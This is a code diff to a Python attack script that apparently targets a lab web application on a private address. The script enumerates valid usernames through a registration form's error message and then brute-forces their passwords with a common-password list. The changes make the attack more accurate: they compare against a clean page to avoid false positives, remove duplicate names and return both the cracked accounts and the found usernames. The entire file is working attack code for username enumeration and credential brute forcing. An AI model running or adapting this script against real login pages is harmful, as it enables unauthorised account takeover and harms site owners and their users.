@@ -9,26 +9,29 @@ def run_attack(base_url="http://192.168.56.1/CyberProject/login.php", input_file
 
     #--- step 1: Enumerating users via the registration page ---
     try:
+        clean_page = requests.get(register_url).text
+
         with open(input_file, "r") as file:
-            potential_names = [line.strip() for line in file if line.strip()]
+            potential_names = list(set(line.strip() for line in file if line.strip()))
         
         print(f"[*] Step 1: Enumerating {len(potential_names)} users...")
         for name in potential_names:
-            payload = {"reg_username": name, "reg_email": "t@t.com", "reg_password": "p", "register_submit": ""}
+            payload = {"reg_username": name, "reg_email": f"{name}@test.com", "reg_password": "p", "register_submit": ""}
             response = requests.post(register_url, data=payload)
             
-            if enum_error in response.text:
-                print(f" [!] Found valid username: {name}")
-                found_users.append(name)
+            if enum_error in response.text and enum_error not in clean_page:
+                if name not in found_users:
+                    found_users.append(name)
+
+        print(f" [!] Found valid usernames: {', '.join(found_users) if found_users else 'None'}")
 
         if not found_users:
             print("[x] No valid users found. Exiting.")
-            return []
+            return [], []
 
         # --- step 2: Brute forcing the found users with common passwords ---
         print(f"\n[*] Step 2: Starting Brute Force on {len(found_users)} users...")
         for user in found_users:
-            print(f" [?] Testing user: {user}")
             for pwd in common_passwords:
                 login_payload = {
                     "username": user,
@@ -53,11 +56,11 @@ def run_attack(base_url="http://192.168.56.1/CyberProject/login.php", input_file
             print(f" -> {acc[0]} : {acc[1]}")
         print("="*40)
 
-        return cracked_accounts
+        return cracked_accounts, found_users
 
     except Exception as e:
         print(f"[!] Error: {e}")
-        return []
+        return [], []
 
 if __name__ == "__main__":
-    run_attack()
+    cracked, found = run_attack()
